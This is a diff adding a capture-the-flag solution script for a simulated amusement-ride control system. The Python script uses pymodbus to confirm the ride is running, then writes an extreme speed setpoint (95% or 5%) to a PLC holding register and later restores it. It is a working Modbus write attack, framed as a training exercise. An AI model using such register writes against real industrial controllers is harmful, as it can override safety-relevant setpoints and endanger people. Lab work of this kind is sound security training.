@@ -1,0 +1,127 @@
+#!/usr/bin/env python3
+"""
+Challenge 05: Launch Override (250 points)
+Difficulty: Medium
+
+Objective: Use Modbus to modify the vehicle speed setpoint to an extreme value
+(above 80% or below 10%) during the Launch Sequence.
+
+Requirements:
+- Ride must be running (state = 2)
+- Write extreme speed value via Modbus (register MW0)
+- Speed must be > 80% or < 10%
+- Must be direct Modbus write, not UI control
+
+Educational Value:
+- Learn register manipulation
+- Understand speed control systems
+- Practice holding register writes
+"""
+
+from pymodbus.client import ModbusTcpClient
+import time
+
+PLC_HOST = 'localhost'
+MAIN_PLC_PORT = 502
+
+def override_speed():
+    """
+    Set extreme speed value via Modbus
+    """
+    print("=" * 60)
+    print("Challenge 05: Launch Override")
+    print("=" * 60)
+    print()
+
+    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)
+
+    if not client.connect():
+        print("✗ Failed to connect to Main PLC")
+        return False
+
+    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
+    print()
+
+    # Check if ride is running
+    result = client.read_holding_registers(2, 1, slave=1)
+    if result.isError():
+        print("✗ Failed to read ride state")
+        client.close()
+        return False
+
+    state = result.registers[0]
+    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
+    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")
+
+    if state != 2:
+        print()
+        print("⚠️  Ride is not running!")
+        print("   Start the ride first, then run this script.")
+        client.close()
+        return False
+
+    # Read current speed
+    result = client.read_holding_registers(0, 1, slave=1)
+    if result.isError():
+        print("✗ Failed to read current speed")
+        client.close()
+        return False
+
+    current_speed = result.registers[0]
+    print(f"Current Speed Setpoint: {current_speed}%")
+    print()
+
+    # Choose extreme speed
+    print("Select speed override:")
+    print("  1) Extreme High Speed (95%)")
+    print("  2) Extreme Low Speed (5%)")
+    print()
+
+    try:
+        choice = input("Enter choice (1 or 2): ").strip()
+        if choice == '1':
+            target_speed = 95
+        elif choice == '2':
+            target_speed = 5
+        else:
+            print("Invalid choice. Defaulting to 95%")
+            target_speed = 95
+    except:
+        target_speed = 95
+
+    print()
+    print(f"Executing attack...")
+    print(f"  → Writing {target_speed}% to speed_setpoint (MW0)")
+
+    # Write extreme speed
+    result = client.write_register(0, target_speed, slave=1)
+    if not result.isError():
+        print(f"  ✓ Speed setpoint changed to {target_speed}%!")
+        print()
+        print("⚠️  Vehicle speed has been overridden to an extreme value!")
+        print("   This affects guest experience and safety margins.")
+        print()
+        print("🎯 Challenge 05 should now be completed!")
+        print("   Check the CTF dashboard to verify.")
+
+        # Restore normal speed after a moment
+        time.sleep(3)
+        print()
+        print("Restoring normal speed setpoint...")
+        client.write_register(0, 50, slave=1)
+        print("✓ Speed restored to 50%")
+
+        client.close()
+        return True
+    else:
+        print("  ✗ Failed to write register")
+        client.close()
+        return False
+
+if __name__ == "__main__":
+    try:
+        override_speed()
+    except KeyboardInterrupt:
+        print("\n\n✗ Attack interrupted by user")
+    except Exception as e:
+        print(f"\n✗ Attack failed: {e}")
